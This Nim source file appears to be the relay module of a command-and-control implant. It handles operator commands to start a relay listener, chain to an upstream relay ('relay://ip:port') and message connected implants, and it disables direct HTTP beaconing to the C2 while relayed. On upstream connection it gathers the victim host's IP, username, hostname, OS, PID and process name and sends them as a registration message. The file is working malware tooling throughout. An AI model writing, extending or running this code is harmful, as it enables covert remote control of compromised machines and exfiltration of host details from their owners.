import strutils, json, times
import ../../core/relay/[relay_protocol, relay_comm, relay_config]
import ../../util/sysinfo

# Import specific functions that actually exist
from ../../core/relay/relay_comm import initializeDistributedRoutingSystem, 
    demonstrateRoutingSystem, testDistributedRoutingSystem, getRoutingPerformanceStats

# Import key management functions from relay_config
from ../../core/relay/relay_config import getKeyConfigStatus, generateImplantID

# Local adaptive timeout calculation to avoid circular imports
proc getLocalAdaptiveTimeout(): int =
    # Start with reasonable defaults and adjust based on success/failure
    result = 100  # 100ms base timeout

# Global relay state using relay_comm.nim types
var g_relayServer*: RelayServer
var upstreamRelay*: RelayConnection
var isConnectedToRelay* = false

# Global variables for immediate chain info updates
var g_immediateChainInfoUpdate*: bool = false
var g_pendingChainInfo*: tuple[role: string, parentGuid: string, port: int]

# Global variable to store parent relay server GUID (set by main.nim)
var g_localParentRelayServerGuid*: string = ""

# Helper functions for main.nim compatibility
proc isRelayServer*(): bool = g_relayServer.isListening
proc relayServerPort*(): int = g_relayServer.port
proc getRelayConnections*(): int = 
    let stats = getConnectionStats(g_relayServer)
    return stats.connections

# Export connection stats function for main.nim
proc getConnectionStats*(server: RelayServer): tuple[connections: int, activeConnections: int, registeredClients: int] {.exportc.} =
    let stats = relay_comm.getConnectionStats(server)
    return (connections: stats.connections, activeConnections: stats.connections, registeredClients: stats.registeredClients)

# Export broadcast message function for main.nim  
proc broadcastMessage*(server: RelayServer, message: RelayMessage): bool {.exportc.} =
    var mutableServer = server  # Create mutable copy
    let sent = relay_comm.broadcastMessage(mutableServer, message)
    return sent > 0

# Export unicast message function for main.nim (PREFERRED)
proc sendToClient*(server: RelayServer, clientID: string, message: RelayMessage): bool {.exportc.} =
    var mutableServer = server  # Create mutable copy
    return relay_comm.sendToClient(mutableServer, clientID, message)

# Export connected clients list function for main.nim
proc getConnectedClients*(server: RelayServer): seq[string] {.exportc.} =
    return relay_comm.getConnectedClients(server)

# Initialize the relay system with distributed routing
proc initializeRelaySystem*(implantID: string): bool =
    try:
        # Initialize with default shared key (can be updated later)
        let systemReady = initializeDistributedRoutingSystem(implantID, "default_shared_key")
        
        if systemReady:
            when defined debug:
                echo "[RELAY] ✅ Distributed routing system initialized successfully"
                echo "[RELAY] 🆔 Implant ID: " & implantID
            
            # Show system demo
            demonstrateRoutingSystem()
            
            return true
        else:
            when defined debug:
                echo "[RELAY] ❌ Failed to initialize distributed routing system"
            return false
            
    except:
        when defined debug:
            echo "[RELAY] ❌ Relay system initialization error: " & getCurrentExceptionMsg()
        return false

# Start relay server with enhanced features
proc startRelayServerEnhanced*(port: int, implantID: string): bool =
    try:
        # Initialize the routing system first
        if not initializeRelaySystem(implantID):
            return false
        
        when defined debug:
            echo "[RELAY] 🚀 Enhanced relay server initialized on port " & $port
            echo "[RELAY] 🛰️ Using distributed routing with persistent routes"
            echo "[RELAY] 🔄 Supporting bidirectional message flow"
        
        # Run system tests
        let testResults = testDistributedRoutingSystem()
        when defined debug:
            echo "[RELAY] 🧪 System tests: " & $testResults.passed & " passed, " & $testResults.failed & " failed"
        
        return true
            
    except:
        when defined debug:
            echo "[RELAY] ❌ Enhanced relay server start error: " & getCurrentExceptionMsg()
        return false

# Connect to relay with enhanced features
proc connectToRelayEnhanced*(host: string, port: int, implantID: string): bool =
    try:
        # Initialize the routing system first
        if not initializeRelaySystem(implantID):
            return false
        
        when defined debug:
            echo "[RELAY] ✅ Enhanced relay client initialized for " & host & ":" & $port
            echo "[RELAY] 🛰️ Using distributed routing with persistent routes"
            echo "[RELAY] 🔄 Supporting bidirectional message flow"
        
        # Test the connection logic
        let connection = connectToRelay(host, port)
        if connection.isConnected:
            when defined debug:
                echo "[RELAY] 📝 Connection established with route tracing capabilities"
            return true
        else:
            when defined debug:
                echo "[RELAY] ❌ Failed to establish connection"
            return false
            
    except:
        when defined debug:
            echo "[RELAY] ❌ Enhanced relay client connection error: " & getCurrentExceptionMsg()
        return false

# Show system status with routing information
proc showRelaySystemStatus*(): string =
    try:
        let keyStatus = getKeyConfigStatus()
        let perfStats = getRoutingPerformanceStats()
        
        result = "[RELAY STATUS]\n"
        result &= "🆔 Implant ID: " & keyStatus.implantID & "\n"
        result &= "🔑 Shared Key: " & (if keyStatus.hasShared: "✅ Available" else: "❌ Missing") & "\n"
        result &= "🔐 Unique Key: " & (if keyStatus.hasUnique: "✅ Available" else: "❌ Missing") & "\n"
        result &= "📊 Avg Route Length: " & $perfStats.avgRouteLength & " hops\n"
        result &= "📊 Max Route Length: " & $perfStats.maxRouteLength & " hops\n"
        result &= "📊 Routing Efficiency: " & $(perfStats.routingEfficiency * 100.0) & "%\n"
        result &= "🚀 System Status: Ready for distributed routing\n"
        
    except:
        result = "[RELAY STATUS] ❌ Error getting system status: " & getCurrentExceptionMsg()

# Test the complete relay system
proc testRelaySystem*(): string =
    try:
        let testResults = testDistributedRoutingSystem()
        
        result = "[RELAY TESTS]\n"
        result &= "🧪 Tests Passed: " & $testResults.passed & "\n"
        result &= "🧪 Tests Failed: " & $testResults.failed & "\n"
        result &= "🧪 Total Tests: " & $(testResults.passed + testResults.failed) & "\n"
        result &= "🧪 Success Rate: " & $(if testResults.passed + testResults.failed > 0: (testResults.passed * 100) div (testResults.passed + testResults.failed) else: 0) & "%\n"
        
        for detail in testResults.details:
            result &= "🧪 " & detail & "\n"
        
        if testResults.failed == 0:
            result &= "🎉 All tests passed! System is ready.\n"
        else:
            result &= "⚠️ Some tests failed. Check system configuration.\n"
            
    except:
        result = "[RELAY TESTS] ❌ Error running tests: " & getCurrentExceptionMsg()

# Process relay commands
proc processRelayCommand*(cmd: string): string =
    when defined debug:
        echo "[RELAY_CMD] 🎯 === PROCESS RELAY COMMAND ==="
        echo "[RELAY_CMD] 🎯 Full command: " & cmd
    
    let parts = cmd.split(" ")
    if parts.len < 2:
        when defined debug:
            echo "[RELAY_CMD] 🎯 ❌ Invalid command format"
        return "Usage: relay <command> [args]"
    
    let subCommand = parts[1]
    when defined debug:
        echo "[RELAY_CMD] 🎯 Sub-command: " & subCommand
    
    case subCommand:
    of "port":
        if parts.len < 3:
            return "Usage: relay port <port_number>"
        
        let port = parseInt(parts[2])
        
        if g_relayServer.isListening:
            return "Relay server already running on port " & $g_relayServer.port
        
        try:
            let implantID = generateImplantID("RELAY-SERVER-" & $port)
            let success = startRelayServerEnhanced(port, implantID)
            
            if success:
                # Start the actual relay server
                g_relayServer = startRelayServer(port)
                
                # IMMEDIATE CHAIN INFO REPORTING: Role change detected
                var newRole = "RELAY_SERVER"
                var parentGuid = ""
                
                # Check if we're also connected upstream (chained relay server)
                if upstreamRelay.isConnected:
                    parentGuid = g_localParentRelayServerGuid
                
                # Signal main loop to send chain info immediately on next cycle
                g_immediateChainInfoUpdate = true
                g_pendingChainInfo = (newRole, parentGuid, port)
                
                return "🚀 Enhanced relay server started on port " & $port & " with distributed routing"
            else:
                return "Failed to start enhanced relay server on port " & $port
        except:
            return "Failed to start enhanced relay server: " & getCurrentExceptionMsg()
    
    of "connect":
        if parts.len < 3:
            return "Usage: relay connect relay://ip:port"
        
        let relayUrl = parts[2]
        
        if not relayUrl.startsWith("relay://"):
            return "Invalid relay URL format. Use: relay://ip:port"
        
        try:
            let cleanUrl = relayUrl.replace("relay://", "").strip(chars = {'"'})
            let urlParts = cleanUrl.split(":")
            if urlParts.len != 2:
                return "Invalid relay URL format"
            
            let host = urlParts[0]
            let port = parseInt(urlParts[1])
            
            if upstreamRelay.isConnected:
                return "Already connected to upstream relay"
            
            let implantID = generateImplantID("RELAY-CLIENT-" & host & "-" & $port)
            let success = connectToRelayEnhanced(host, port, implantID)
            
            if success:
                # Connect to the actual relay
                upstreamRelay = connectToRelay(host, port)
                if upstreamRelay.isConnected:
                    isConnectedToRelay = true  # Disable HTTP communication
                    
                    # Send registration message
                    let route = @[implantID, "UPSTREAM"]
                    
                    # Collect system information for relay registration  
                    let localIP = getLocalIP()
                    let username = getUsername()
                    let hostname = getSysHostname()
                    let osInfo = getOSInfo()
                    let pid = getCurrentPID()
                    let processName = getCurrentProcessName()
                    
                    # Create registration data as JSON
                    let regData = %*{
                        "implantID": implantID,
                        "localIP": localIP,
                        "username": username,
                        "hostname": hostname,
                        "osInfo": osInfo,
                        "pid": pid,
                        "processName": processName,
                        "timestamp": epochTime().int64,
                        "capabilities": ["relay", "client", "distributed_routing"],
                        "mode": "enhanced_relay_connect"
                    }
                    
                    let registerMsg = createMessage(REGISTER, implantID, route, $regData)
                    
                    if sendMessage(upstreamRelay, registerMsg):
                        # IMMEDIATE CHAIN INFO REPORTING: Role change detected
                        var newRole = "RELAY_CLIENT"
                        var parentGuid = g_localParentRelayServerGuid
                        
                        # Signal main loop to send chain info immediately on next cycle
                        g_immediateChainInfoUpdate = true
                        g_pendingChainInfo = (newRole, parentGuid, 0)  # Client has no listening port
                        
                        return "🔗 Enhanced relay client connected to " & host & ":" & $port & " with distributed routing"
                    else:
                        return "Enhanced connection established but failed to register with relay"
                else:
                    return "Enhanced connection failed to establish"
            else:
                return "Failed to initialize enhanced relay client"
        except:
            return "Failed to connect to relay (enhanced): " & getCurrentExceptionMsg()
    
    of "disconnect":
        if not upstreamRelay.isConnected:
            return "Not connected to any upstream relay"
        
        try:
            # IMMEDIATE CHAIN INFO REPORTING: Role change detected
            var newRole = "STANDARD"
            if g_relayServer.isListening:
                newRole = "RELAY_SERVER"
            
            # Signal main loop to send chain info immediately on next cycle
            g_immediateChainInfoUpdate = true
            g_pendingChainInfo = (newRole, "", g_relayServer.port)
            
            # Disconnect from upstream relay
            closeConnection(upstreamRelay)
            isConnectedToRelay = false  # Re-enable HTTP communication
            
            return "Disconnected from upstream relay (HTTP re-enabled)"
        except:
            return "Failed to disconnect: " & getCurrentExceptionMsg()
    
    of "status":
        try:
            let enhancedStatus = showRelaySystemStatus()
            
            # Add traditional relay status info
            var status = "=== ENHANCED RELAY STATUS ===\n"
            status &= enhancedStatus & "\n"
            
            # Add connection info
            status &= "=== CONNECTION STATUS ===\n"
            status &= "Relay Server: " & (if g_relayServer.isListening: "Running on port " & $g_relayServer.port else: "Stopped") & "\n"
            
            let stats = getConnectionStats(g_relayServer)
            status &= "Total Connections: " & $stats.connections & "\n"
            status &= "Registered Clients: " & $stats.registeredClients & "\n"
            
            # List connected clients
            if g_relayServer.isListening and stats.registeredClients > 0:
                let connectedClients = relay_comm.getConnectedClients(g_relayServer)
                status &= "Client List: "
                for i, clientID in connectedClients:
                    if i > 0: status &= ", "
                    status &= clientID
                status &= "\n"
            
            status &= "Upstream Relay: " & (if upstreamRelay.isConnected: "Connected" else: "Disconnected") & "\n"
            status &= "HTTP to C2: " & (if isConnectedToRelay: "DISABLED (using relay)" else: "ENABLED") & "\n"
            status &= "Protocol: Enhanced Multi-Client with Distributed Routing\n"
            status &= "Features: Route tracing, Bidirectional flow, Smart encryption\n"
            
            return status
        except:
            # Fallback to basic status if enhanced fails
            var status = "=== BASIC RELAY STATUS ===\n"
            status &= "Relay Server: " & (if g_relayServer.isListening: "Running on port " & $g_relayServer.port else: "Stopped") & "\n"
            status &= "Upstream Relay: " & (if upstreamRelay.isConnected: "Connected" else: "Disconnected") & "\n"
            status &= "Note: Enhanced status temporarily unavailable\n"
            return status
    
    of "test":
        try:
            let testResults = testRelaySystem()
            return testResults
        except:
            return "Failed to run relay system tests: " & getCurrentExceptionMsg()
    
    of "stop":
        if not g_relayServer.isListening:
            return "Relay server is not running"
        
        try:
            # IMMEDIATE CHAIN INFO REPORTING: Role change detected
            var newRole = "STANDARD"
            var parentGuid = ""
            
            # Signal main loop to send chain info immediately on next cycle
            g_immediateChainInfoUpdate = true
            g_pendingChainInfo = (newRole, parentGuid, 0)
            
            # Stop the relay server
            closeRelayServer(g_relayServer)
            return "🛑 Enhanced relay server stopped (secure shutdown with distributed routing cleanup)"
        except:
            return "Failed to stop relay server: " & getCurrentExceptionMsg()
    
    of "clients":
        if not g_relayServer.isListening:
            return "Relay server is not running"
        
        let stats = getConnectionStats(g_relayServer)
        var result = "=== Connected Relay Clients ===\n"
        result &= "Total connections: " & $stats.connections & "\n"
        result &= "Registered clients: " & $stats.registeredClients & "\n\n"
        
        if stats.registeredClients > 0:
            let connectedClients = getConnectedClients(g_relayServer)
            result &= "Client List:\n"
            for i, clientID in connectedClients:
                result &= "  " & $(i + 1) & ". " & clientID & "\n"
        else:
            result &= "No clients registered\n"
        
        return result
    
    of "send":
        if parts.len < 4:
            return "Usage: relay send <clientID> <message>"
        
        if not g_relayServer.isListening:
            return "Relay server is not running"
        
        let targetClientID = parts[2]
        let message = parts[3..^1].join(" ")
        
        # Create a test message to send to specific client
        let testMsg = createMessage(HTTP_RESPONSE, "RELAY-SERVER", @[targetClientID], message)
        let success = sendToClient(g_relayServer, targetClientID, testMsg)
        
        if success:
            return "Message sent to client: " & targetClientID
        else:
            return "Failed to send message to client: " & targetClientID & " (client not found or disconnected)"
    
    else:
        return "Unknown relay command. Available:\n" &
               "  relay port <port>      - Start enhanced relay server with distributed routing\n" &
               "  relay connect <url>    - Connect to upstream relay with distributed routing\n" &
               "  relay disconnect       - Disconnect from upstream\n" &
               "  relay status           - Show enhanced relay status and routing information\n" &
               "  relay test             - Run distributed routing system tests\n" &
               "  relay clients          - List connected clients\n" &
               "  relay send <id> <msg>  - Send message to specific client\n" &
               "  relay stop             - Stop relay server"

# Poll relay server for new messages
proc pollRelayServerMessages*(): seq[RelayMessage] =
    if not g_relayServer.isListening:
        return @[]
    
    try:
        # Process ALL available messages to prevent backlog
        var allMessages: seq[RelayMessage] = @[]
        var continuePolling = true
        var pollCount = 0
        
        while continuePolling and pollCount < 10:  # Max 10 polls to prevent infinite loop
            pollCount += 1
            let adaptiveTimeout = getLocalAdaptiveTimeout()
            let messages = pollRelayServer(g_relayServer, adaptiveTimeout)
            
            if messages.len > 0:
                allMessages.add(messages)
                when defined debug:
                    echo "[DEBUG] 🔄 Relay polling cycle " & $pollCount & ": got " & $messages.len & " messages (timeout: " & $adaptiveTimeout & "ms)"
            else:
                continuePolling = false  # No more messages available
        
        when defined debug:
            if allMessages.len > 0:
                echo "[DEBUG] 📥 Total messages processed: " & $allMessages.len & " (in " & $pollCount & " cycles)"
        
        return allMessages
    except Exception as e:
        when defined debug:
            echo "[DEBUG] Error polling relay server messages: " & e.msg
        return @[]

# Poll upstream relay for messages
proc pollUpstreamRelayMessages*(): seq[RelayMessage] =
    when defined debug:
        echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Checking connection status: " & $upstreamRelay.isConnected
    
    if not upstreamRelay.isConnected:
        return @[]
    
    try:
        # Use adaptive timeout to adjust to network conditions
        let adaptiveTimeout = getLocalAdaptiveTimeout()
        let messages = pollMessages(upstreamRelay, adaptiveTimeout)
        
        when defined debug:
            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Got " & $messages.len & " messages (timeout: " & $adaptiveTimeout & "ms)"
        
        return messages
    except Exception as e:
        when defined debug:
            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Error polling upstream relay messages: " & e.msg
        upstreamRelay.isConnected = false
        return @[]

# Cleanup dead connections
proc cleanupRelayConnections*() =
    if g_relayServer.isListening:
        cleanupConnections(g_relayServer)